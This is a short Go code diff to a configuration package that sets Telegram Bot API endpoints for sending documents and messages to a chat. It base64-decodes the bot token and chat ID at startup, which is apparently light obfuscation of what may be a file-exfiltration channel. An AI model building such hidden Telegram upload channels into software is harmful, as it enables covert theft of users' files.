@@ -1,6 +1,7 @@
 package config
 
 import (
+	"encoding/base64"
 	"path"
 	"runtime"
 	"watsap/utils/files"
@@ -47,9 +48,25 @@ var (
 var (
 	TgBotAPI      = "https://api.telegram.org/bot"
 	TgFileApiURL  = "/sendDocument"
-	TgSendTextMsg = "/sendMessage?chat_id=" + TG_CHAT_ID + "&text="
 )
 
+func GetTgSendTextMsg() string {
+	return "/sendMessage?chat_id=" + TG_CHAT_ID + "&text="
+}
+
+// Decode helper
+func decodeBase64Str(encoded string) string {
+	decoded, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return ""
+	}
+	return string(decoded)
+}
+
+func InitConfig() {
+	TG_BOT_TOKEN = decodeBase64Str(TG_BOT_TOKEN)
+	TG_CHAT_ID = decodeBase64Str(TG_CHAT_ID)
+}
 /*
 func Printvar() {
 	fmt.Println(TG_BOT_TOKEN)
